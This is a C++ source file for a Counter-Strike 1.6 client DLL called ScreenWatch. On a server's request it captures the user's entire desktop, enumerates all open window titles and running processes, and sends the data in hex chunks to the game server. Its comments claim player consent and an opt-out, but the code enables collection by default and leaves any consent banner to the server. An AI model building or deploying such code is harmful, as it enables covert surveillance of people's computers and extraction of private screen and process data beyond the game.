/*
 * ScreenWatch 1.2 - CLIENT module (Windows, CS 1.6)
 * by FaTaL-[Hit] - https://t.me/Neo_Norm
 * Loaded via dll_load (revEmu etc.) or a server launcher. Player is notified
 * in-game and can opt out any time with "sw_off".
 * Build on Linux (cross-compile, 32-bit to match CS 1.6):
 *   sudo apt install g++-mingw-w64-i686
 *   i686-w64-mingw32-g++ -O2 -shared -static -s -o sw_client.dll \
 *       screenwatch_client.cpp -lgdi32 -luser32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>

typedef void (__cdecl *pfnClientCmd_t)(char *);
static pfnClientCmd_t g_pClientCmd = NULL;
static volatile LONG g_Busy = 0;
static volatile LONG g_Enabled = 1;   /* player can opt out: sw_off */

#define SW_CHUNK_BYTES 384

static void SwCmd(const char *fmt, ...) {
if (!g_pClientCmd) return;
char buf[512];
va_list ap; va_start(ap, fmt); _vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
buf[sizeof(buf) - 1] = 0;
g_pClientCmd(buf);
}

static DWORD WINAPI WorkerThread(LPVOID param);

/* ---------------- screenshot (GDI -> 8bpp gray BMP, max width 1280) ------ */

static int WriteBmpFileScaled(const char *path, int maxW) {
HDC hScr = GetDC(NULL);
if (!hScr) return 0;
int w = GetDeviceCaps(hScr, HORZRES);
int h = GetDeviceCaps(hScr, VERTRES);
int dw = w, dh = h;
if (maxW > 0 && w > maxW) { dw = maxW; dh = MulDiv(h, maxW, w); }

HDC hMem = CreateCompatibleDC(hScr);
HBITMAP hBmp = CreateCompatibleBitmap(hScr, dw, dh);
HBITMAP hOld = (HBITMAP)SelectObject(hMem, hBmp);
BitBlt(hMem, 0, 0, dw, dh, hScr, 0, 0, SRCCOPY | CAPTUREBLT);

BITMAPINFO bi; ZeroMemory(&bi, sizeof(bi));
bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
bi.bmiHeader.biWidth = dw; bi.bmiHeader.biHeight = -dh;
bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24;
bi.bmiHeader.biCompression = BI_RGB;
BYTE *rgb = (BYTE *)malloc((size_t)dw * dh * 3);
int got = GetDIBits(hMem, hBmp, 0, dh, rgb, &bi, DIB_RGB_COLORS);
SelectObject(hMem, hOld); DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(NULL, hScr);
if (!got) { free(rgb); return 0; }

size_t stride = ((dw + 3) & ~3);
size_t pixSz = stride * dh;
size_t total = 14 + 40 + 1024 + pixSz;
BYTE *out = (BYTE *)calloc(1, total);
if (!out) { free(rgb); return 0; }

BITMAPFILEHEADER *fh = (BITMAPFILEHEADER *)out;
fh->bfType = 0x4D42; fh->bfSize = (DWORD)total; fh->bfOffBits = 14 + 40 + 1024;
BITMAPINFOHEADER *ih = (BITMAPINFOHEADER *)(out + 14);
ih->biSize = 40; ih->biWidth = dw; ih->biHeight = dh;
ih->biPlanes = 1; ih->biBitCount = 8; ih->biSizeImage = (DWORD)pixSz;
RGBQUAD *pal = (RGBQUAD *)(out + 54);
for (int i = 0; i < 256; i++) { pal[i].rgbRed = pal[i].rgbGreen = pal[i].rgbBlue = (BYTE)i; }
for (int y = 0; y < dh; y++) {
BYTE *srcRow = rgb + (size_t)y * dw * 3;
BYTE *dstRow = out + 54 + 1024 + (size_t)(dh - 1 - y) * stride;
for (int x = 0; x < dw; x++) {
BYTE r = srcRow[x*3+2], gg = srcRow[x*3+1], b = srcRow[x*3+0];
dstRow[x] = (BYTE)((r*77 + gg*150 + b*29) >> 8);
}
}
FILE *f = fopen(path, "wb");
if (f) { fwrite(out, 1, total, f); fclose(f); }
free(out); free(rgb);
return f ? (int)total : 0;
}

/* ---------------- window / process enumeration -------------------------- */

struct WinCollector { char *buf; size_t cap; size_t len; };

static BOOL CALLBACK EnumWinProc(HWND hwnd, LPARAM lp) {
WinCollector *c = (WinCollector *)lp;
if (!IsWindowVisible(hwnd)) return TRUE;
char title[128] = {0};
GetWindowTextA(hwnd, title, sizeof(title));
char cls[96] = {0};
GetClassNameA(hwnd, cls, sizeof(cls));
if (!title[0] && !cls[0]) return TRUE;
if (strstr(cls, "WorkerW") || strstr(cls, "Progman")) return TRUE;
int n = _snprintf(c->buf + c->len, c->cap - c->len, "%s|%s;", title, cls);
if (n > 0) c->len += (size_t)n;
return TRUE;
}

static void CollectWindows(char *buf, size_t cap) {
WinCollector c = { buf, cap, 0 };
buf[0] = 0;
EnumWindows(EnumWinProc, (LPARAM)&c);
}

static void CollectProcs(char *buf, size_t cap) {
buf[0] = 0; size_t len = 0;
HANDLE hs = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (hs == INVALID_HANDLE_VALUE) return;
PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
if (Process32First(hs, &pe)) {
do {
int n = _snprintf(buf + len, cap - len, "%s;", pe.szExeFile);
if (n > 0) len += (size_t)n; else break;
} while (Process32Next(hs, &pe));
}
CloseHandle(hs);
}

/* ---------------- chunk sender ------------------------------------------- */

static void SendFileChunked(const char *path, const char *cmdPrefix) {
FILE *f = fopen(path, "rb");
if (!f) return;
fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
int chunks = (int)((sz + SW_CHUNK_BYTES - 1) / SW_CHUNK_BYTES);
SwCmd("%s_begin %d %d", cmdPrefix, (int)sz, chunks);
BYTE raw[SW_CHUNK_BYTES];
char hex[SW_CHUNK_BYTES * 2 + 8];
for (int i = 0; i < chunks; i++) {
size_t rd = fread(raw, 1, SW_CHUNK_BYTES, f);
hex[0] = 0;
for (size_t j = 0; j < rd; j++) sprintf(hex + j * 2, "%02X", raw[j]);
size_t pos = 0;
while (pos < strlen(hex)) {
size_t take = strlen(hex) - pos; if (take > 700) take = 700;
char part[720]; memcpy(part, hex + pos, take); part[take] = 0;
SwCmd("%s_chunk %d %s", cmdPrefix, i, part);
pos += take;
}
Sleep(15);
}
fclose(f);
SwCmd("%s_end", cmdPrefix);
DeleteFileA(path);
}

/* ---------------- worker -------------------------------------------------- */

static DWORD WINAPI WorkerThread(LPVOID param) {
int flags = (int)(INT_PTR)param;
char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp);
char shot[MAX_PATH]; _snprintf(shot, MAX_PATH, "%ssw_shot.bmp", tmp);

if (flags & 1) {
char wins[1536]; CollectWindows(wins, sizeof(wins));
SwCmd("sw_windows \"%s\"", wins);
char procs[1536]; CollectProcs(procs, sizeof(procs));
SwCmd("sw_procs \"%s\"", procs);
}
if (flags & 2) {
int sz = WriteBmpFileScaled(shot, 1280);
if (sz > 0) SendFileChunked(shot, "sw_shot");
else SwCmd("sw_shot_failed");
}
InterlockedExchange(&g_Busy, 0);
return 0;
}

static void HandleRequest(int flags) {
if (!InterlockedCompareExchange(&g_Enabled, 1, 1)) return; /* opted out */
if (InterlockedCompareExchange(&g_Busy, 1, 0) != 0) return;
HANDLE th = CreateThread(NULL, 0, WorkerThread, (LPVOID)(INT_PTR)flags, 0, NULL);
if (th) CloseHandle(th); else InterlockedExchange(&g_Busy, 0);
}

/* ---------------- entry points -------------------------------------------- */

/* Trigger channels:
   1) Loader/usermsg route: server sends usermsg "SWRq", loader bridge calls
      SW_OnRequest(flags).
   2) Universal route: server broadcasts the client command "sw_do <flags>";
      screenwatch.cfg maps it here via SW_Do(). */
extern "C" __declspec(dllexport) void SW_OnRequest(int flags) { HandleRequest(flags); }
extern "C" __declspec(dllexport) void SW_Do(int flags) { HandleRequest(flags); }

static void FindClientCmd() {
HMODULE hCl = GetModuleHandleA("cl.dll");
if (hCl) g_pClientCmd = (pfnClientCmd_t)GetProcAddress(hCl, "ClientCmd");
if (!g_pClientCmd) {
HMODULE hGame = GetModuleHandleA("cstrike.dll");
if (hGame) g_pClientCmd = (pfnClientCmd_t)GetProcAddress(hGame, "ClientCmd");
}
}

static DWORD WINAPI SelfInit(LPVOID) {
Sleep(4000); /* wait until engine + cl.dll are fully up */
FindClientCmd();
if (!g_pClientCmd) { Sleep(6000); FindClientCmd(); }
if (g_pClientCmd) SwCmd("sw_ready %d", 1); /* server shows consent banner; "sw_off" opts out */
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
if (reason == DLL_PROCESS_ATTACH) {
DisableThreadLibraryCalls(hinst);
CreateThread(NULL, 0, SelfInit, NULL, 0, NULL);
}
return TRUE;
}

extern "C" __declspec(dllexport) int SW_Install(void) {
FindClientCmd();
if (g_pClientCmd) { SwCmd("sw_ready %d", 1); return 1; }
return 0;
}
extern "C" __declspec(dllexport) void SW_SetEnabled(int on) { InterlockedExchange(&g_Enabled, on ? 1 : 0); }
